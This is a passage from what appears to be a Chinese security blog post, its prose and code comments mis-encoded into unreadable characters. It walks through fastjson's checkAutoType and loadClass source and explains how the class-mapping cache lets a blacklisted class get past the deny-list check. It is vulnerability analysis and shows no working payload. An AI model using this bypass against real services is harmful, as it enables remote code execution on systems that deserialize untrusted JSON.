</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">final</span> <span style="color:#fff;font-weight:bold">long</span> h3 = (((((BASIC ^ className.<span style="color:#007f7f">charAt</span>(<span style="color:#ff0;font-weight:bold">0</span>))
</span></span><span style="display:flex;"><span>                * PRIME)
</span></span><span style="display:flex;"><span>                ^ className.<span style="color:#007f7f">charAt</span>(<span style="color:#ff0;font-weight:bold">1</span>))
</span></span><span style="display:flex;"><span>                * PRIME)
</span></span><span style="display:flex;"><span>                ^ className.<span style="color:#007f7f">charAt</span>(<span style="color:#ff0;font-weight:bold">2</span>))
</span></span><span style="display:flex;"><span>                * PRIME;
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// autoTypeSupport ä¸º true æ—¶ï¼Œå…ˆå¯¹æ¯” acceptHashCodes åŠ è½½ç™½åå•é¡¹
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span> (autoTypeSupport || expectClass != <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">long</span> hash = h3;
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">for</span> (<span style="color:#fff;font-weight:bold">int</span> i = <span style="color:#ff0;font-weight:bold">3</span>; i &lt; className.<span style="color:#007f7f">length</span>(); ++i) {
</span></span><span style="display:flex;"><span>                hash ^= className.<span style="color:#007f7f">charAt</span>(i);
</span></span><span style="display:flex;"><span>                hash *= PRIME;
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">if</span> (Arrays.<span style="color:#007f7f">binarySearch</span>(acceptHashCodes, hash) &gt;= <span style="color:#ff0;font-weight:bold">0</span>) {
</span></span><span style="display:flex;"><span>                    clazz = TypeUtils.<span style="color:#007f7f">loadClass</span>(typeName, defaultClassLoader, <span style="color:#fff;font-weight:bold">false</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">if</span> (clazz != <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>                        <span style="color:#fff;font-weight:bold">return</span> clazz;
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#007f7f">// åœ¨å¯¹æ¯” denyHashCodes è¿›è¡Œé»‘åå•åŒ¹é…
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>                <span style="color:#007f7f">// å¦‚æœé»‘åå•æœ‰åŒ¹é…å¹¶ä¸” TypeUtils.mappings é‡Œæ²¡æœ‰ç¼“å­˜è¿™ä¸ªç±»
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>                <span style="color:#007f7f">// åˆ™æŠ›å‡ºå¼‚å¸¸
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>                <span style="color:#fff;font-weight:bold">if</span> (Arrays.<span style="color:#007f7f">binarySearch</span>(denyHashCodes, hash) &gt;= <span style="color:#ff0;font-weight:bold">0</span> &amp;&amp; TypeUtils.<span style="color:#007f7f">getClassFromMapping</span>(typeName) == <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">throw</span> <span style="color:#fff;font-weight:bold">new</span> JSONException(<span style="color:#0ff;font-weight:bold">&#34;autoType is not support. &#34;</span> + typeName);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// å°è¯•åœ¨ TypeUtils.mappings ä¸­æŸ¥æ‰¾ç¼“å­˜çš„ class
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span> (clazz == <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>            clazz = TypeUtils.<span style="color:#007f7f">getClassFromMapping</span>(typeName);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// å°è¯•åœ¨ deserializers ä¸­æŸ¥æ‰¾è¿™ä¸ªç±»
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span> (clazz == <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>            clazz = deserializers.<span style="color:#007f7f">findClass</span>(typeName);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// å¦‚æœæ‰¾åˆ°äº†å¯¹åº”çš„ classï¼Œåˆ™ä¼šè¿›è¡Œ return
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span> (clazz != <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">if</span> (expectClass != <span style="color:#fff;font-weight:bold">null</span>
</span></span><span style="display:flex;"><span>                    &amp;&amp; clazz != java.<span style="color:#007f7f">util</span>.<span style="color:#007f7f">HashMap</span>.<span style="color:#007f7f">class</span>
</span></span><span style="display:flex;"><span>                    &amp;&amp; !expectClass.<span style="color:#007f7f">isAssignableFrom</span>(clazz)) {
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">throw</span> <span style="color:#fff;font-weight:bold">new</span> JSONException(<span style="color:#0ff;font-weight:bold">&#34;type not match. &#34;</span> + typeName + <span style="color:#0ff;font-weight:bold">&#34; -&gt; &#34;</span> + expectClass.<span style="color:#007f7f">getName</span>());
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> clazz;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// å¦‚æœæ²¡æœ‰å¼€å¯ AutoTypeSupport ï¼Œåˆ™å…ˆåŒ¹é…é»‘åå•ï¼Œåœ¨åŒ¹é…ç™½åå•ï¼Œä¸ä¹‹å‰é€»è¾‘ä¸€è‡´
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span> (!autoTypeSupport) {
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">long</span> hash = h3;
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">for</span> (<span style="color:#fff;font-weight:bold">int</span> i = <span style="color:#ff0;font-weight:bold">3</span>; i &lt; className.<span style="color:#007f7f">length</span>(); ++i) {
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">char</span> c = className.<span style="color:#007f7f">charAt</span>(i);
</span></span><span style="display:flex;"><span>                hash ^= c;
</span></span><span style="display:flex;"><span>                hash *= PRIME;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">if</span> (Arrays.<span style="color:#007f7f">binarySearch</span>(denyHashCodes, hash) &gt;= <span style="color:#ff0;font-weight:bold">0</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">throw</span> <span style="color:#fff;font-weight:bold">new</span> JSONException(<span style="color:#0ff;font-weight:bold">&#34;autoType is not support. &#34;</span> + typeName);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">if</span> (Arrays.<span style="color:#007f7f">binarySearch</span>(acceptHashCodes, hash) &gt;= <span style="color:#ff0;font-weight:bold">0</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">if</span> (clazz == <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>                        clazz = TypeUtils.<span style="color:#007f7f">loadClass</span>(typeName, defaultClassLoader, <span style="color:#fff;font-weight:bold">false</span>);
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">if</span> (expectClass != <span style="color:#fff;font-weight:bold">null</span> &amp;&amp; expectClass.<span style="color:#007f7f">isAssignableFrom</span>(clazz)) {
</span></span><span style="display:flex;"><span>                        <span style="color:#fff;font-weight:bold">throw</span> <span style="color:#fff;font-weight:bold">new</span> JSONException(<span style="color:#0ff;font-weight:bold">&#34;type not match. &#34;</span> + typeName + <span style="color:#0ff;font-weight:bold">&#34; -&gt; &#34;</span> + expectClass.<span style="color:#007f7f">getName</span>());
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">return</span> clazz;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// å¦‚æœ class è¿˜ä¸ºç©ºï¼Œåˆ™ä½¿ç”¨ TypeUtils.loadClass å°è¯•åŠ è½½è¿™ä¸ªç±»
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span> (clazz == <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>            clazz = TypeUtils.<span style="color:#007f7f">loadClass</span>(typeName, defaultClassLoader, <span style="color:#fff;font-weight:bold">false</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (clazz != <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">if</span> (TypeUtils.<span style="color:#007f7f">getAnnotation</span>(clazz,JSONType.<span style="color:#007f7f">class</span>) != <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">return</span> clazz;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">if</span> (ClassLoader.<span style="color:#007f7f">class</span>.<span style="color:#007f7f">isAssignableFrom</span>(clazz) <span style="color:#007f7f">// classloader is danger
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>                    || DataSource.<span style="color:#007f7f">class</span>.<span style="color:#007f7f">isAssignableFrom</span>(clazz) <span style="color:#007f7f">// dataSource can load jdbc driver
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>                    ) {
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">throw</span> <span style="color:#fff;font-weight:bold">new</span> JSONException(<span style="color:#0ff;font-weight:bold">&#34;autoType is not support. &#34;</span> + typeName);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">if</span> (expectClass != <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">if</span> (expectClass.<span style="color:#007f7f">isAssignableFrom</span>(clazz)) {
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">return</span> clazz;
</span></span><span style="display:flex;"><span>                } <span style="color:#fff;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">throw</span> <span style="color:#fff;font-weight:bold">new</span> JSONException(<span style="color:#0ff;font-weight:bold">&#34;type not match. &#34;</span> + typeName + <span style="color:#0ff;font-weight:bold">&#34; -&gt; &#34;</span> + expectClass.<span style="color:#007f7f">getName</span>());
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            JavaBeanInfo beanInfo = JavaBeanInfo.<span style="color:#007f7f">build</span>(clazz, clazz, propertyNamingStrategy);
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">if</span> (beanInfo.<span style="color:#007f7f">creatorConstructor</span> != <span style="color:#fff;font-weight:bold">null</span> &amp;&amp; autoTypeSupport) {
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">throw</span> <span style="color:#fff;font-weight:bold">new</span> JSONException(<span style="color:#0ff;font-weight:bold">&#34;autoType is not support. &#34;</span> + typeName);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">final</span> <span style="color:#fff;font-weight:bold">int</span> mask = Feature.<span style="color:#007f7f">SupportAutoType</span>.<span style="color:#007f7f">mask</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">boolean</span> autoTypeSupport = <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">autoTypeSupport</span>
</span></span><span style="display:flex;"><span>                || (features &amp; mask) != <span style="color:#ff0;font-weight:bold">0</span>
</span></span><span style="display:flex;"><span>                || (JSON.<span style="color:#007f7f">DEFAULT_PARSER_FEATURE</span> &amp; mask) != <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (!autoTypeSupport) {
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">throw</span> <span style="color:#fff;font-weight:bold">new</span> JSONException(<span style="color:#0ff;font-weight:bold">&#34;autoType is not support. &#34;</span> + typeName);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> clazz;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç”±ä»¥ä¸Šä»£ç å¯çŸ¥ï¼Œè¿™é‡Œå­˜åœ¨ä¸€ä¸ªé€»è¾‘é—®é¢˜ï¼šautoTypeSupport ä¸º true æ—¶ï¼Œfastjson ä¼šç¦æ­¢ä¸€äº›é»‘åå•çš„ç±»ååºåˆ—åŒ–ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªåˆ¤æ–­æ¡ä»¶ï¼šå½“ååºåˆ—åŒ–çš„ç±»åœ¨é»‘åå•ä¸­ï¼Œä¸” TypeUtils.mappings ä¸­æ²¡æœ‰è¯¥ç±»çš„ç¼“å­˜æ—¶ï¼Œæ‰ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚è¿™é‡Œå°±ç•™ä¸‹äº†ä¸€ä¸ªä¼ç¬”ã€‚å°±æ˜¯è¿™ä¸ªé€»è¾‘å¯¼è‡´äº† 1.2.32 ä¹‹å‰çš„ç‰ˆæœ¬å°†ä¼šå—åˆ° autoTypeSupport çš„å½±å“ã€‚</p>
<p>åœ¨ autoTypeSupport ä¸ºé»˜è®¤çš„ false æ—¶ï¼Œç¨‹åºç›´æ¥æ£€æŸ¥é»‘åå•å¹¶æŠ›å‡ºå¼‚å¸¸ï¼Œåœ¨è¿™éƒ¨åˆ†æˆ‘ä»¬æ— æ³•ç»•è¿‡ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„å…³æ³¨ç‚¹å°±åœ¨åˆ¤æ–­ä¹‹å‰ï¼Œç¨‹åºæœ‰åœ¨ TypeUtils.mappings ä¸­å’Œ deserializers ä¸­å°è¯•æŸ¥æ‰¾è¦ååºåˆ—åŒ–çš„ç±»ï¼Œå¦‚æœæ‰¾åˆ°äº†ï¼Œåˆ™å°±ä¼š returnï¼Œè¿™å°±é¿å¼€ä¸‹é¢ autoTypeSupport é»˜è®¤ä¸º false æ—¶çš„æ£€æŸ¥ã€‚å¦‚ä½•æ‰èƒ½åœ¨è¿™ä¸¤æ­¥ä¸­å°†æˆ‘ä»¬çš„æ¶æ„ç±»åŠ è½½è¿›å»å‘¢ï¼Ÿ</p>
<p>å…ˆçœ‹ deserializers ï¼Œä½äº <code>com.alibaba.fastjson.parser.ParserConfig.deserializers</code> ï¼Œæ˜¯ä¸€ä¸ª IdentityHashMapï¼Œèƒ½å‘å…¶ä¸­èµ‹å€¼çš„å‡½æ•°æœ‰ï¼š</p>
<ul>
<li><code>getDeserializer()</code>ï¼šè¿™ä¸ªç±»ç”¨æ¥åŠ è½½ä¸€äº›ç‰¹å®šç±»ï¼Œä»¥åŠæœ‰ <code>JSONType</code> æ³¨è§£çš„ç±»ï¼Œåœ¨ put ä¹‹å‰éƒ½æœ‰ç±»ååŠç›¸å…³ä¿¡æ¯çš„åˆ¤æ–­ï¼Œæ— æ³•ä¸ºæˆ‘ä»¬æ‰€ç”¨ã€‚</li>
<li><code>initDeserializers()</code>ï¼šæ— å…¥å‚ï¼Œåœ¨æ„é€ æ–¹æ³•ä¸­è°ƒç”¨ï¼Œå†™æ­»ä¸€äº›è®¤ä¸ºæ²¡æœ‰å±å®³çš„å›ºå®šå¸¸ç”¨ç±»ï¼Œæ— æ³•ä¸ºæˆ‘ä»¬æ‰€ç”¨ã€‚</li>
<li><code>putDeserializer()</code>ï¼šè¢«å‰ä¸¤ä¸ªå‡½æ•°è°ƒç”¨ï¼Œæˆ‘ä»¬æ— æ³•æ§åˆ¶å…¥å‚ã€‚</li>
</ul>
<p>å› æ­¤æˆ‘ä»¬æ— æ³•å‘ deserializers ä¸­å†™å…¥å€¼ï¼Œä¹Ÿå°±åœ¨å…¶ä¸­è¯»å‡ºæˆ‘ä»¬æƒ³è¦çš„æ¶æ„ç±»ã€‚æ‰€ä»¥æˆ‘ä»¬çš„ç›®å…‰è½¬å‘äº† <code>TypeUtils.getClassFromMapping(typeName)</code>ã€‚</p>
<p>åŒæ ·çš„ï¼Œè¿™ä¸ªæ–¹æ³•ä» <code>TypeUtils.mappings</code> ä¸­å–å€¼ï¼Œè¿™æ˜¯ä¸€ä¸ª ConcurrentHashMap å¯¹è±¡ï¼Œèƒ½å‘å…¶ä¸­èµ‹å€¼çš„å‡½æ•°æœ‰ï¼š</p>
<ul>
<li><code>addBaseClassMappings()</code>ï¼šæ— å…¥å‚ï¼ŒåŠ è½½</li>
<li><code>loadClass()</code>ï¼šå…³é”®å‡½æ•°</li>
</ul>
<p>æ¥ä¸‹æ¥çœ‹ä¸€ä¸‹ <code>loadClass()</code> çš„ä»£ç ï¼š</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">56
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span style="color:#fff;font-weight:bold">boolean</span> cache) {
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// éç©ºåˆ¤æ–­
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span>(className == <span style="color:#fff;font-weight:bold">null</span> || className.<span style="color:#007f7f">length</span>() == <span style="color:#ff0;font-weight:bold">0</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// é˜²æ­¢é‡å¤æ·»åŠ 
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        Class&lt;?&gt; clazz = mappings.<span style="color:#007f7f">get</span>(className);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span>(clazz != <span style="color:#fff;font-weight:bold">null</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> clazz;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// åˆ¤æ–­ className æ˜¯å¦ä»¥ [ å¼€å¤´
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span>(className.<span style="color:#007f7f">charAt</span>(<span style="color:#ff0;font-weight:bold">0</span>) == <span style="color:#0ff;font-weight:bold">&#39;[&#39;</span>){
</span></span><span style="display:flex;"><span>            Class&lt;?&gt; componentType = loadClass(className.<span style="color:#007f7f">substring</span>(<span style="color:#ff0;font-weight:bold">1</span>), classLoader);
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> Array.<span style="color:#007f7f">newInstance</span>(componentType, <span style="color:#ff0;font-weight:bold">0</span>).<span style="color:#007f7f">getClass</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// åˆ¤æ–­ className æ˜¯å¦ L å¼€å¤´ ; ç»“å°¾
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span>(className.<span style="color:#007f7f">startsWith</span>(<span style="color:#0ff;font-weight:bold">&#34;L&#34;</span>) &amp;&amp; className.<span style="color:#007f7f">endsWith</span>(<span style="color:#0ff;font-weight:bold">&#34;;&#34;</span>)){
</span></span><span style="display:flex;"><span>            String newClassName = className.<span style="color:#007f7f">substring</span>(<span style="color:#ff0;font-weight:bold">1</span>, className.<span style="color:#007f7f">length</span>() - <span style="color:#ff0;font-weight:bold">1</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> loadClass(newClassName, classLoader);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">try</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#007f7f">// å¦‚æœ classLoader éç©ºï¼Œcache ä¸º true åˆ™ä½¿ç”¨è¯¥ç±»åŠ è½½å™¨åŠ è½½å¹¶å­˜å…¥ mappings ä¸­
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>            <span style="color:#fff;font-weight:bold">if</span>(classLoader != <span style="color:#fff;font-weight:bold">null</span>){
